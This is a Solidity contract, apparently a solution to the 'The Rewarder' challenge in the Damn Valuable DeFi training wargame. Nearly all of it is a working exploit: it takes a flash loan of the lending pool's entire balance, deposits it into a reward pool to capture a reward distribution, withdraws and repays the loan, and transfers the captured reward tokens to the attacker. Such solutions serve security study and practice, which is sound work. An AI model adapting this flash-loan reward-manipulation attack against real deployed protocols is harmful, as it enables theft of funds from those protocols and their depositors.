// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../the-rewarder/TheRewarderPool.sol';
import '../the-rewarder/FlashLoanerPool.sol';
import '../the-rewarder/RewardToken.sol';
import '../DamnValuableToken.sol';

contract RewarderExploit {

    TheRewarderPool public pool;
    DamnValuableToken public token;
    FlashLoanerPool public loan;
    RewardToken public reward;
    uint256 public value;

    constructor(address _pool, address _token, address _loan, address _reward){
        pool = TheRewarderPool(_pool);
        token = DamnValuableToken(_token);
        loan = FlashLoanerPool(_loan);
        reward = RewardToken(_reward);
    }

    function attack() public {
        //balance of flashloan
        value = token.balanceOf(address(loan));
        //borrow all from flash loan
        loan.flashLoan(value);

        //transfer reward tokens to attacker
        reward.transfer(msg.sender,reward.balanceOf(address(this)));
        
    }


    function receiveFlashLoan(uint256 _amount) public{
        
        //approve transfer from exploit to pool for the full amount of the loan
        token.approve(address(pool), _amount);

        //deposit into reward pool then withdraw
        pool.deposit(_amount);
        pool.withdraw(value);

        //payback flash loan
        token.transfer(address(loan), value);
    }


}